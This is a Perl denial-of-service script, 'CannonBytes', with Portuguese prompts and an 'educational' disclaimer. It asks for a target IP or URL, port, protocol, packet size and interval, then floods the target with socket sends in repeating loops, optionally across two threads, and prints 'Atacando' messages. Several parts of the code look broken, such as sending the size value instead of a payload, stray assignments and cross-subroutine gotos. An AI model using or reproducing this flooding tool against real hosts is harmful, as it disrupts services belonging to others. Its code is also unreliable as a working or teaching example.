#!/usr/bin/perl
#
# ESTE SCRIPT TEM A FINALIDADE DE ENSINAR AS PESSOAS COMO QUE FUNCIONA UM ATAQUE DOS ( NEGAÇÃO DE SERVIÇO ).
# NÃO ME RESPONSABILIZO PELO MAL USO DO SCRIPT!
# 
#
# USE, EDITE, COMPILE. MAS SEMPRE DISTRIBUA O CÓDIGO FONTE!
# CONHECIMENTO DEVE SER LIVRE E DE TODOS! 
#
# CODED BY: HackerOrientado
# sigam no twitter -> @HackerOrientado
#


################# MÓDULOS 
use warnings;
use strict;
use threads;
use threads::shared;
use IO::Socket::INET;
use Getopt::Long;

################# INTRODUÇÃO
my $baner ="
   ____
  /    \\
 /  ___/
|  /      _____   _    _   _    _    ____    _    _
|  |___  /  _  | | \\  | | | \\  | |  /    \\  | \\  | |
 \\     \\ | ( ) | | |\\\ | | | |\\ | | |  ()  | | |\\ | |
  \\____/ \\__/\\_| |_|\\\\|_| |_|\\\\|_|  \\____/  |_|\\\\|_|
              _____                                 
             |   _  \\  __    __  _________   _____     ___   
             |  |_|  | \\ \\  / / |___   ___| |  ___|  / __/
             |   ___/_  \\ \\/ /      | |     | |__   / /__
             |   __   \\  \\  /       | |     |  __|  \\__  \\
             |  |__|  |  | |        | |     | |___   __/  |
             |________/  |_|        |_|     |_____| \\____/
                                                             v0.9.1\n\n
";

################# VARIAVEIS
my ( $OS, $limpar, $ajuda, $ip, $porta, $pacote, $vezes, $protocolo, $intervalo, $socket, $site, $i, $threads );
my ( $thr1, $thr2 );
my $ciclo = 1;
my $escuta = 1;
$OS = $^O;

################# VERIFICAÇÃO DO SISTEMA OPERACIONAL
if ( $OS eq "MSWin32" ) {
	$limpar = ("cls");
} else {
	$limpar = ("clear");
}
system "$limpar";

################# OPÇÕES NO MODO LINHA DE COMANDO
my $opt = GetOptions (
	'h' 		=> \$ajuda,
	'threads' 	=> \$threads,
);

################# COMANDO DE AJUDA
if ($ajuda) {
	print "$baner";
	print "\n\n";
	print "[\!] COMANDO DE AJUDA \n\n\n";
	print "   [\?] >perl CannonBytes\.pl [IP OU URL] Porta Pacote Vezes Protocolo Intervalo\n\n";
	print "\t[\?] >perl CannonBytes\.pl 192.168.1.2 80 64000 1000 tcp 60 -threads\n\n";
	sleep 1.5;
	exit (0);
}

################# CRIAÇÃO DAS THREADS E EXECUÇÃO DAS DUAS AO MESMO TEMPO!
if ($threads) {
$thr1 = threads->create('thr1', '1');
$thr2 = threads->create('thr2', '2');
$thr1,$thr2->join();
} else {
	return thr1();
}

################# SUB ROTINA DA THREAD 1
sub thr1 {
	my $ARGC = @ARGV;
	
	if ( ($ip, $porta, $pacote, $vezes, $protocolo, $intervalo) = @ARGV ) {
		goto args;
	} else { 
		print "$baner";
		print "Digite o IP ou URL\n";
		print "-> ";
		$ip = <STDIN>; chomp $ip;
	
		print "\n\n";
		print "Agora digite a porta que deseja atacar\n";
		print "-> ";
		$porta = <STDIN>; chomp $porta;
	
		dados:
		print "\n\n";
		print "Digite o tamanho do pacote que sera enviado\n";
		print "-> ";
		$pacote = <STDIN>; chomp $pacote;
		if ( $pacote > 64000 ) {
			sleep 1.5;
			print "Digite valores entre 32 e 64000!\n\n";
			goto dados;
		}	
	
		print "\n\n";
		print "Digite o numero de vezes que sera atacado o alvo\n";
		print "-> ";
		$vezes = <STDIN>; chomp $vezes;
	
		print "\n\n";
		print "Digite qual o tipo de protocolo que vc deseja usar para o ataque\n";
		print "-> ";
		$protocolo = <STDIN>; chomp $protocolo;
	
		print "\n\n";
		print "Digite o valor do intervalo de tempo entre os ataques\n";
		print "-> ";
		$intervalo = <STDIN>; chomp $intervalo;

		args:
		system "$limpar";
		print "$baner\nAperte Ctrl+C para parar o ataque\n\n";
        sleep 2;
	
		ataque:
################# CRIAÇÃO DOS SOCKETS
		$socket = IO::Socket::INET->new (
			PeerAddr 	=> $ip, 
			PeerPort 	=> $porta, 
			Proto 		=> $protocolo ) or die "Nao foi possivel se conectar ao IP ou Porta.\nCheque se tudo esta correto!\n";
		
################# ATAQUE E LOOP
		if ( $ip =~ /www./ ) {
			$site = "site";
		} else {
			$site = "ip";
		}
		for ( $i = 0; $i < $vezes; $i++ ) {
			size => $pacote;
			$ciclo => 1,
			$escuta => 1,
			print "Atacando o $site $ip na porta $porta com o tamanho do pacote $pacote\n";
			send ($socket, $pacote, $ciclo, $escuta);
		}
	
################# INTERVALO DO LOOP
		print "\n\n";
		print "O programa vai esperar $intervalo segundo ate o proximo ataque.\n";
		sleep $intervalo;
		print "\n";
		goto ataque;
	}
}

################# SUB ROTINA DA THREAD 2
sub thr2 {
	sleep 2;
	my $ARGC = @ARGV;

	if ( ($ip, $porta, $pacote, $vezes, $protocolo, $intervalo) = @ARGV ) {
		goto ataque;
	}

	ataque:	
################# CRIAÇÃO DOS SOCKETS
	$socket = IO::Socket::INET->new (
		PeerAddr 	=> $ip, 
		PeerPort 	=> $porta, 
		Proto 		=> $protocolo ) or die "Nao foi possivel se conectar ao IP ou Porta.\nCheque se tudo esta correto!\n";
		
################# ATAQUE E LOOP
	if ( $ip =~ /www./ ) {
		$site = "site";
	} else {
		$site = "ip";
	}
	for ( $i = 0; $i < $vezes; $i++ ) {
	size => $pacote;
	$ciclo => 1,
	$escuta => 1,
	print "Atacando o $site $ip na porta $porta com o tamanho do pacote $pacote\n";
	send ($socket, $pacote, $ciclo, $escuta);
	}
	
################# INTERVALO DO LOOP :D
	print "\n\n";
	print "O programa vai esperar $intervalo segundo ate o proximo ataque.\n";
	sleep $intervalo;
	print "\n";
	goto ataque;
}

# EOF #